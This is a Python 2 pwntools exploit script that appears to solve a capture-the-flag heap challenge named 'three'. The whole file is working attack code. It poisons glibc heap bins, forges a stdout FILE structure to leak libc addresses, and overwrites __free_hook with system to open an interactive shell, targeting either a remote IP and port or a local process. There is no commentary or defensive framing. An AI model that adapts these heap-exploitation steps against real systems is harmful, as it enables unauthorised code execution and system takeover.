#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    gdb_command = '''
        breakrva 0xdc4
    '''
    alloc('0')
    alloc(p64(0) * 7 + p64(0x11))
    delete(1, 'y')
    delete(0, 'n')
    edit(0, '\x50')
    alloc('\x00')
    alloc('\x00')
    delete(0, 'y')
    delete(1, 'y')
    alloc('\x00')

    for i in range(8):
        if i == 7:
            edit(2, p64(0) + p64(0x51) + p64(0))
            delete(0, 'n')
            edit(2, p64(0) + p64(0x91) + p64(0))
            delete(0, 'y')
            break
        edit(2, p64(0) + p64(0x91) + p64(0))
        delete(0, 'n')

    # edit(2, p64(0) + p64(0x91) + '\x40\x37')
    edit(2, p64(0) + p64(0x91) + '\x60\x37')
    alloc('\x01')
    fakefile = p64(0xfbad1800) + p64(0) * 3 + '\x00'
    alloc(fakefile)
    r.recv(8)
    raw = r.recv(6)
    magic_libc = u64(raw.ljust(8, '\x00'))
    libc_addr = magic_libc - 0x3ed8b0
    free_hook = libc_addr + 0x3ed8e8
    system_addr = libc_addr + 0x4f440
    # rce_addr = libc_addr + 0x4f2c5
    log.info('Libc addr: ' + hex(libc_addr))

    # gdb.attach(r, gdb_command)
    edit(2, p64(0) + p64(0x51))
    delete(0, 'y')
    edit(2, p64(0) + p64(0x51) + p64(free_hook))
    alloc('\x00')
    edit(2, '/bin/sh\x00' + p64(0x41))
    delete(0, 'y')
    
    alloc(p64(system_addr))
    r.sendlineafter('Your choice:', '3')
    r.sendlineafter('Input the idx:', '2')

    r.interactive()


def alloc(content):
    r.sendlineafter('Your choice:', '1')
    r.sendafter('Input the content:', content)


def edit(idx, content):
    r.sendlineafter('Your choice:', '2')
    r.sendlineafter('Input the idx:', str(idx))
    r.sendafter('Input the content:', content)


def delete(idx, clear):
    r.sendlineafter('Your choice:', '3')
    r.sendlineafter('Input the idx:', str(idx))
    r.sendlineafter('Clear?(y/n):', clear)


if __name__ == '__main__':
    context.terminal = ['konsole', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('39.96.13.122', 9999)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./three', env={'LD_PRELOAD': './libc.so.6'})
        LOCAL = True
    else:
        exit()
    exploit()
